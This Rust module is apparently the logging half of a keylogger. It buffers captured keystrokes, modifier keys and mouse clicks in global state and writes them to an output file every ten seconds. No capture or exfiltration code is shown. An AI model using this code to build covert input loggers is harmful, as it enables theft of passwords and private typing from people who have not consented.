use std::{collections::LinkedList, io::Write, path::PathBuf, thread::sleep, time::Duration};

pub(crate) static mut BUF: LinkedList<Input> = LinkedList::new();
pub(crate) static mut OUTPATH: Option<PathBuf> = None;

pub(crate) enum Input {
    Keyboard {
        keycord: u32,
        alt: bool,
        ctrl: bool,
        shift: bool,
    },
    Mouse {
        position: (u32, u32),
    },
    Enter,
    Backspace,
    Space,
}

#[must_use]
pub(crate) unsafe fn write_to_file() -> ! {
    // std::fs::remove_file(OUTPATH.as_ref().unwrap()).ok();
    let mut file = std::fs::File::create(OUTPATH.as_ref().unwrap()).unwrap();
    loop {
        if BUF.len() == 0 {
            sleep(Duration::from_secs(10));
            continue;
        }
        let mut buf = String::new();
        for _ in 0..BUF.len() {
            let input = BUF.pop_front().unwrap();
            match input {
                Input::Keyboard {
                    keycord,
                    alt,
                    ctrl,
                    shift,
                } => {
                    if !alt && !ctrl && !shift {
                        buf.push_str(&format!("{}", keycord as u8 as char));
                    } else {
                        buf.push_str("<");
                        if alt {
                            buf.push_str("A");
                        }
                        if ctrl {
                            buf.push_str("C");
                        }
                        if shift {
                            buf.push_str("S");
                        }
                        buf.push_str(&format!("-{}>", keycord as u8 as char));
                    }
                }
                Input::Enter => buf.push_str("\n"),
                Input::Mouse { position } => {
                    buf.push_str(&format!("\n[[CLICK: {}, {}]]\n", position.0, position.1))
                }
                Input::Backspace => buf.push_str("<B>"),
                Input::Space => buf.push_str(" "),
            }
        }
        file.write_all(buf.as_bytes()).unwrap();
        file.flush().unwrap();
    }
}
